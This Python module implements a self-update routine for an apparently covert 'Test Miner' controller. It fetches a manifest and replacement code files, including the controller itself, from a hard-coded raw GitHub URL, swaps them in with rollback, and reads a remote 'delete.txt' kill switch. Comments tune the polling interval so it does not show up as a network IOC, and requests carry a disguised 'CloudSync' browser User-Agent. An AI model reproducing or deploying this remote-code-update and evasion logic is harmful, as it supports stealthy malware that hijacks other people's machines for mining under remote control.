"""Manifest-pinned self-update with SHA-256 verification and ``.prev`` rollback.

Mirrors the update half of ``F:\\Test Miner\\controller.py``:

* ``maybe_update()`` runs at most every :data:`UPDATE_INTERVAL` seconds.  It
  fetches the published ``manifest.json``, and for every ``files[]`` entry that
  carries a sha256 it downloads the file from the update channel, verifies the
  hash, compile-checks ``*.py`` payloads before adopting them, copies the old
  file to ``<name>.prev`` and writes the new one atomically.
* ``controller.py`` (or its package successor) => ``True`` (supervisor restarts
  itself); ``config_high.json`` => ``"restart-worker"``; anything else => the
  file is swapped in place and ``False`` is returned.
* A transient download failure retries in 5 minutes instead of 15.
* ``handle_probation()`` rolls back a controller update that failed to get going
  (``update.json`` attempts >= 3 -> restore ``controller.py.prev``).
* ``remote_kill()`` reads the channel's ``delete.txt`` kill switch.

Nothing runs at import time.  The network fetch is injectable (``fetch``), so the
whole updater can be exercised offline with a fake transport.
"""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import time
import urllib.request

from .config.settings import DEFAULT_UPDATE_FILES, read_json
from .core.state import atomic_write

__all__ = [
    "UPDATE_INTERVAL",
    "RETRY_SECONDS",
    "PROBATION_SECONDS",
    "PROBATION_ATTEMPTS",
    "UPDATE_MARK",
    "UPDATE_TARGET",
    "KILL_FILE",
    "DEFAULT_UPDATE_FILES",
    "Updater",
    "handle_probation",
    "remote_kill",
]

UPDATE_INTERVAL = 900        # 15 min; frequent polling is a network IOC
RETRY_SECONDS = 300          # retry a failed update fetch in 5 min
PROBATION_SECONDS = 300      # a new controller must survive this long
PROBATION_ATTEMPTS = 3       # starts before the .prev rollback
UPDATE_MARK = "update.json"
UPDATE_TARGET = "controller.py"
KILL_FILE = "delete.txt"

_MIN_BODY = 40               # ignore truncated/error bodies (parity)


# ---------------------------------------------------------------------------
# small helpers
# ---------------------------------------------------------------------------


def _sha256_file(path):
    """Hex SHA-256 of a file, or None when it cannot be read."""
    try:
        digest = hashlib.sha256()
        with open(path, "rb") as handle:
            for chunk in iter(lambda: handle.read(1 << 20), b""):
                digest.update(chunk)
        return digest.hexdigest()
    except Exception:
        return None


def _install_dir(settings, install_dir=None):
    if install_dir:
        return os.fspath(install_dir)
    if settings is None:
        return os.getcwd()
    if isinstance(settings, (str, bytes, os.PathLike)):
        return os.fspath(settings)
    return getattr(settings, "install_dir", None) or os.getcwd()


def _default_fetch(url, timeout=30):
    """Fetch bytes from the update channel (TLS via urllib)."""
    try:
        request = urllib.request.Request(
            url, headers={"User-Agent": "Mozilla/5.0 CloudSync/1.0",
                          "Cache-Control": "no-cache"})
        return urllib.request.urlopen(request, timeout=timeout).read()
    except TypeError:  # very old Python / odd monkeypatch: plain call
        return urllib.request.urlopen(url, timeout=timeout).read()


def _normalise_logger(logger):
    if logger is None:
        return lambda _message: None
    if callable(logger):
        return logger
    for name in ("log", "write"):
        method = getattr(logger, name, None)
        if callable(method):
            return method
    return lambda _message: None


# ---------------------------------------------------------------------------
# Updater
# ---------------------------------------------------------------------------


class Updater:
    """Incremental, hash-pinned self-update for one install directory."""

    def __init__(self, settings=None, *, fetch=None, clock=None, log=None,
                 install_dir=None, update_interval=UPDATE_INTERVAL):
        self.settings = settings
        self.install_dir = _install_dir(settings, install_dir)
        self._fetch = fetch or _default_fetch
        self._clock = clock or time.time
        self._log = _normalise_logger(log)
        self.update_interval = float(update_interval)
        self.last = 0.0
        self._warned = False

    def __repr__(self):
        return "Updater(%r, last=%r)" % (self.install_dir, self.last)

    # -- settings helpers ---------------------------------------------------

    def path(self, name):
        return os.path.join(self.install_dir, name)

    def _update_url(self, name):
        helper = getattr(self.settings, "update_url", None)
        if callable(helper):
            return helper(name)
        base = getattr(self.settings, "update_base",
                       "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/")
        if not base.endswith("/"):
            base += "/"
        return base + name

    def _remote_enabled(self):
        return bool(getattr(self.settings, "remote_update", True))

    def _legacy_update(self):
        return bool(getattr(self.settings, "legacy_update", False))

    def _fetch_bytes(self, name, timeout=30):
        return self._fetch(self._update_url(name), timeout)

    # -- target list --------------------------------------------------------

    def _targets(self):
        """Return ``(name, sha256-or-None)`` pairs to sync, like the controller."""
        try:
            raw = self._fetch_bytes("manifest.json", 20)
            manifest = json.loads(raw)
            targets = []
            for entry in (manifest.get("files") or []):
                name = entry.get("path") or ""
                sha = str(entry.get("sha256") or "").lower()
                if name and sha and not sha.startswith("__"):
                    targets.append((name, sha))
            if targets:
                return targets
            self._log("manifest.json has no usable file list")
        except Exception:
            if not self._legacy_update():
                if not self._warned:
                    self._warned = True
                    self._log(
                        "no manifest.json in the repo - remote update idle. "
                        "Publish manifest.json (make-manifest.ps1), or set "
                        '"legacy_update": true in manifest.json.')
                return []
            self._log("no manifest.json - legacy direct-update mode")
        return [(name, None) for name in DEFAULT_UPDATE_FILES]

    # -- the update step ----------------------------------------------------

    def maybe_update(self):
        """Check the channel; update files when due.  Safe to call every tick.

        Returns ``True`` when a supervisor restart is required, ``"restart-worker"``
        when only the worker config changed, else ``False``.
        """
        if not self._remote_enabled():
            if not self._warned:
                self._warned = True
                self._log("remote update DISABLED (manifest.json: remote_update=false)")
            return False

        now = self._clock()
        if now - self.last < self.update_interval:
            return False
        self.last = now

        changed = []
        failed = False
        for name, wanted in self._targets():
            local = self.path(name)
            try:
                data = self._fetch_bytes(name, 30)
            except Exception as exc:
                self._log("update download failed: %s (%s)" % (name, exc))
                failed = True
                continue
            if not data or len(data) < _MIN_BODY:
                continue
            got = hashlib.sha256(data).hexdigest()
            if _sha256_file(local) == got:
                continue
            if wanted and got != wanted:
                self._log("update hash mismatch, ignoring: %s" % name)
                continue
            if name.endswith(".py"):
                try:
                    compile(data, name, "exec")
                except SyntaxError as exc:
                    self._log("update rejected (syntax): %s %s" % (name, exc))
                    continue
            if os.path.isfile(local):
                try:
                    shutil.copy2(local, local + ".prev")
                except OSError:
                    pass
            try:
                atomic_write(local, data)
            except OSError as exc:
                self._log("update write failed: %s (%r)" % (name, exc))
                continue
            changed.append(name)
            self._log("updated %s" % name)

        if failed:
            # a transient fetch failure must not cost 15 minutes: retry in 5
            self.last = self._clock() - self.update_interval + RETRY_SECONDS

        if UPDATE_TARGET in changed:
            atomic_write(self.path(UPDATE_MARK),
                         json.dumps({"applied": time.time(), "attempts": 0}))
            return True
        if "config_high.json" in changed:
            return "restart-worker"
        return False


# ---------------------------------------------------------------------------
# probation / kill switch
# ---------------------------------------------------------------------------


def handle_probation(install_dir=None, *, settings=None, log=None,
                     target=UPDATE_TARGET, mark=UPDATE_MARK,
                     attempts=PROBATION_ATTEMPTS):
    """Roll back a controller update that cannot get going; True when rolled back.

    ``update.json`` carries an ``attempts`` counter; each start increments it and
    at *attempts* the previous controller (``<target>.prev``) is restored and the
    marker removed, exactly like ``controller.handle_probation``.
    """
    log = _normalise_logger(log)
    base = _install_dir(settings, install_dir)
    marker_path = os.path.join(base, mark)
    marker = read_json(marker_path, None)
    if not isinstance(marker, dict):
        return False

    try:
        count = int(marker.get("attempts", 0)) + 1
    except (TypeError, ValueError):
        count = 1

    if count >= attempts:
        previous = os.path.join(base, target + ".prev")
        destination = os.path.join(base, target)
        if os.path.isfile(previous):
            try:
                shutil.copy2(previous, destination)
                log("rolled controller back to .prev after %d failed starts" % count)
                os.remove(marker_path)
                return True
            except OSError as exc:
                log("rollback failed: %r" % (exc,))
        try:
            os.remove(marker_path)
        except OSError:
            pass
        return False

    marker["attempts"] = count
    try:
        atomic_write(marker_path, json.dumps(marker))
    except OSError as exc:
        log("could not update probation marker: %r" % (exc,))
    return False


def remote_kill(settings=None, *, fetch=None, log=None, name=KILL_FILE,
                timeout=10):
    """True when the update channel's ``delete.txt`` is non-empty (kill switch)."""
    fetch = fetch or _default_fetch
    log = _normalise_logger(log)
    url = None
    helper = getattr(settings, "update_url", None)
    if callable(helper):
        url = helper(name)
    else:
        base = getattr(settings, "update_base",
                       "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/")
        if not base.endswith("/"):
            base += "/"
        url = base + name
    try:
        body = fetch(url, timeout)
        return bool(body and body.strip())
    except Exception:
        return False
